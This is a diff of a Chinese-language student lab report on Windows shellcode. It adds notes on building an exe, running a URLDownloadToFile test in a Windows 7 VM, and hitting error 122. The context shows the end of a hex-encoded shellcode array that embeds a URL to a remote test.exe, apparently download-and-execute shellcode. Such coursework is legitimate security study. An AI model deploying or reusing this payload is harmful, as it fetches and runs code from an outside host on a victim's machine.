@@ -90,6 +90,7 @@ int main(int argc, char **argv)
 
 ### 拿win10的代码到win7虚拟机下跑
 
+- 生成可执行的exe
 - 把vs工程的属性设为
   
   <img src="./img/release+MFC.png">
@@ -164,6 +165,12 @@ char shellcode[] = \
 "\x72\x69\x74\x79\x2f\x62\x6c\x6f\x62\x2f\x6d\x61\x73\x74\x65\x72\x2f\x68\x77\x2d\x30"
 "\x78\x30\x34\x2d\x53\x68\x65\x6c\x6c\x63\x6f\x64\x65\x2f\x65\x78\x65\x2f\x74\x65\x73\x74\x2e\x65\x78\x65\x00";
 ```
+
+跑urldownloadtofile
+
+<img src="./img/urldownloaderror.png">
+
+- 〖122〗-传递到系统调用的数据区太小
 
 # References
 
